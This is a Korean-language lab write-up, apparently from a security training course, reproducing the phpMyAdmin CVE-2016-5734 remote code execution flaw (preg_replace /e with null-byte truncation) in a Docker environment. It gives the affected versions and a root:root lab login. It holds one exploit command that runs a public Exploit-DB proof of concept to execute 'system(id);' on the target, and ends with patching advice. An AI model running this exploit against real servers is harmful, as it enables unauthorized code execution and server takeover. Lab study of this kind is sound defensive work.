# CVE-2016-5734 | PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution(RCE)

> 화이트햇 스쿨 3기 (6반) - [임건형 (@lghz)](https://github.com/lghz) 

[중국어 버전(Chinese version)](README.zh-cn.md)

<br/>

PhpMyAdmin은 PHP로 작성된 무료 소프트웨어 도구로, 웹을 통해 MySQL 관리를 처리하기 위해 만들어졌습니다. 취약점은 preg_replace 함수에 있으며, 사용자가 제출한 정보가 첫 번째 매개변수에 삽입될 수 있기 때문입니다.

PHP 5.4.7 이전 버전에서는 preg_replace의 첫 번째 매개변수가 \0으로 잘려나갈 수 있었고, 검색 패턴이 \e로 변경될 수 있었습니다. 이로 인해 원격 코드 실행 취약점이 발생할 수 있습니다.

영향을 받는 버전:

4.0.x 버전 중 4.0.10.16 이전 버전

4.4.x 버전 중 4.4.15.7 이전 버전

4.6.x 버전 중 4.6.3 이전 버전 (사실 이 버전은 PHP 5.5 이상을 요구하므로, 이 취약점은 재현되지 않습니다)

<br/>

## 환경 설정

다음 명령어를 실행하여 PHP 5.3 + Apache + phpMyAdmin 4.4.15.6 환경을 시작하세요:

```
docker compose up -d 
```
![1](https://github.com/user-attachments/assets/f49ce01c-6d80-4ec6-9527-2f47c881b3c5)

</br>

시작한 후 http://your-ip:8080에 접속하면 phpMyAdmin 로그인 페이지가 나타납니다.
root:root 계정으로 로그인하세요.
![image](https://github.com/user-attachments/assets/2f6247ad-71c3-4744-89e3-58b897be6cfc)


</br>

## 익스플로잇

이 취약점을 이용하려면 로그인과 데이터 쓰기 권한이 필요합니다.

우리는 이 POC(https://www.exploit-db.com/exploits/40185/) 를 사용하여 취약점을 재현합니다.

```
./cve-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/
```

## 결과
![image](https://github.com/user-attachments/assets/0b789a2e-843d-498a-b513-88e03b0af463)

</br>

## 정리
이 취약점은 인증된 사용자가 원격으로 서버에서 임의의 코드를 실행할 수 있도록 허용하는 문제를 가지고 있다. 공격자는 이를 악용하여 서버에 대한 제어를 획득하거나 추가적인 공격을 수행할 수 있게 된다. 이를 방지하기 위해서는 사용 중인 phpMyAdmin 버전과 PHP 버전을 최신 버전으로 업데이트하여 취약점을 근본적으로 해결해야 한다. 또한, 웹 서버의 접근 제어를 강화하고, phpMyAdmin 외에 다른 안전한 관리 도구를 사용하는 것도 고려할 수 있다. 더불어, 사용자 입력 데이터가 악의적인 코드 실행으로 이어지지 않도록 필터링하는 보안 강화가 필요하다.
